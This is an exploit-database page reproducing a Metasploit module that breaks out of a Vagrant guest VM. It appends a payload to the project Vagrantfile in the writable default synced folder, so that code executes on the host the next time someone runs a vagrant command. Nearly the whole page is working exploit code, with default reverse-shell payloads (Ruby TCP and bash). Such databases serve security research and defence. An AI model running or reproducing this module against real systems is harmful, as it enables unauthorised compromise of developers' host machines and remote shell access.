---
title: Vagrant Synced Folder Vagrantfile Breakout
url: https://cxsecurity.com/issue/WLB-2022100068
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-28
fetch_date: 2025-10-03T21:06:25.605963
---

# Vagrant Synced Folder Vagrantfile Breakout

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Vagrant Synced Folder Vagrantfile Breakout** **2022.10.27**  Credit:  **[Brendan Coles](https://cxsecurity.com/author/Brendan%2BColes/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Local
Rank = ExcellentRanking
include Msf::Post::File
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Vagrant Synced Folder Vagrantfile Breakout',
'Description' => %q{
This module exploits a default Vagrant synced folder (shared folder)
to append a Ruby payload to the Vagrant project Vagrantfile config file.
By default, unless a Vagrant project explicitly disables shared folders,
Vagrant mounts the project directory on the host as a writable 'vagrant'
directory on the guest virtual machine. This directory includes the
project Vagrantfile configuration file.
Ruby code within the Vagrantfile is loaded and executed when a user
runs any vagrant command from the project directory on the host,
leading to execution of Ruby code on the host.
},
'License' => MSF\_LICENSE,
'Author' => [
'HashiCorp', # Vagrant defaults
'bcoles' # Metasploit
],
'DisclosureDate' => '2011-01-19', # Vagrant 0.7.0 release date - first mention of shared folders in CHANGELOG
'Platform' => %w[ruby],
'Arch' => ARCH\_ALL,
'SessionTypes' => [ 'shell', 'powershell', 'meterpreter' ],
'Stance' => Msf::Exploit::Stance::Passive,
'DefaultOptions' => {
'DisablePayloadHandler' => true
},
'Targets' => [
[
'Ruby Code',
{
'Platform' => 'ruby',
'Arch' => ARCH\_RUBY,
'Type' => :ruby,
'DefaultOptions' => {
'PAYLOAD' => 'ruby/shell\_reverse\_tcp'
}
}
],
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd,
'Payload' => { 'BadChars' => '`' },
'DefaultOptions' => {
'PAYLOAD' => 'cmd/unix/reverse\_bash'
}
}
]
],
'DefaultTarget' => 0,
'References' => [
['URL', 'https://www.vagrantup.com/docs/synced-folders'],
['URL', 'https://www.virtualbox.org/manual/ch04.html#sharedfolders']
],
'Notes' => {
'Reliability' => [ REPEATABLE\_SESSION ],
'Stability' => [ CRASH\_SAFE ],
'SideEffects' => [ ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS, CONFIG\_CHANGES ]
}
)
)
register\_options([
OptString.new('VAGRANTFILE\_PATH', [false, 'Path to Vagrantfile (leave blank to auto detect)', ''])
])
end
# Search potential default shared directories for Vagrantfile configuration file
def find\_vagrantfile\_path
unless datastore['VAGRANTFILE\_PATH'].blank?
return exists?(datastore['VAGRANTFILE\_PATH']) ? datastore['VAGRANTFILE\_PATH'] : nil
end
# Default Vagrant synced folders (aka shared folders)
default\_shared\_directories = [
'C:\\vagrant\\',
'/vagrant/'
]
default\_shared\_directories.each do |dir\_path|
begin
vagrant\_shared\_dir\_contents = dir(dir\_path)
rescue Rex::Post::Meterpreter::RequestError
next
end
next if vagrant\_shared\_dir\_contents.empty?
# Vagrant project configuration file name is case-insensitive (typically "Vagrantfile")
vagrant\_shared\_dir\_contents.each do |fname|
return "#{dir\_path}#{fname}" if fname.downcase == 'vagrantfile'
end
end
nil
end
def vagrantfile
@vagrantfile ||= find\_vagrantfile\_path
end
def check
return CheckCode::Safe('Vagrantfile not found.') unless vagrantfile
# `writable?' method does not support Windows systems
begin
return CheckCode::Detected("#{vagrantfile} is not writable.") unless writable?(vagrantfile)
rescue RuntimeError
return CheckCode::Detected("Could not verify if #{vagrantfile} is writable.")
end
CheckCode::Appears("#{vagrantfile} is writable!")
end
def exploit
fail\_with(Failure::NotVulnerable, 'Could not find Vagrantfile') unless vagrantfile
case target['Type']
when :ruby
data = payload.encoded
when :unix\_cmd
data = "`#{payload.encoded}`"
else
fail\_with(Failure::NoTarget, 'No target selected')
end
print\_status("Appending payload (#{data.length} bytes) to #{vagrantfile} ...")
unless append\_file(vagrantfile, "\n#{data}\n")
fail\_with(Failure::Unknown, "Could not write to #{vagrantfile}")
end
print\_status("Payload appended to #{vagrantfile}")
print\_status('The payload will be executed when a user runs any vagrant command from within the project directory on the host system.')
print\_warning("This module requires manual removal of the payload from the project Vagrantfile: #{vagrantfile}")
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100068)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top